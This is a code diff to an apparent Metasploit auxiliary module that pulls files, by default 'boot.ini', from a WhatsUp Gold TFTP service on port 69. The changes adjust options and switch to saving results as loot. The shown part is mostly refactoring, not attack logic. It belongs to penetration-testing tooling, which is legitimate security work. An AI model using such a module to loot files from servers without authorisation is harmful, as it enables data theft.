@@ -39,7 +39,8 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(69),
-				OptString.new('FILENAME', [true, 'The file to loot', 'boot.ini']),
+				OptString.new('FILENAME', [false, 'The file to loot', 'boot.ini']),
+				OptBool.new('SAVE', [false, 'Save the downloaded file to disk', 'false'])
 			], self.class)
 	end
 
@@ -81,8 +82,8 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		if file_data.empty?
-			print_error("Error retrieving file #{file_name} from #{ip}")
-			return
+				print_error("Error retrieving file #{file_name} from #{ip}")
+				return
 		end
 
 		udp_sock.close
@@ -91,8 +92,13 @@ class Metasploit3 < Msf::Auxiliary
 		vprint_line(file_data.to_s)
 
 		# Save file to disk
-		fname = Rex::Text.rand_text_alpha(5) + "_" + File.basename(datastore['FILENAME'])
-		path = store_local("whatsupgold.file", "application/octet-stream", file_data, fname)
+		path = store_loot(
+			'whatsupgold.tftp',
+			'application/octet-stream',
+			ip,
+			file_data,
+			datastore['FILENAME']
+		)
 
 		print_status("File saved in: #{path}")
 	end
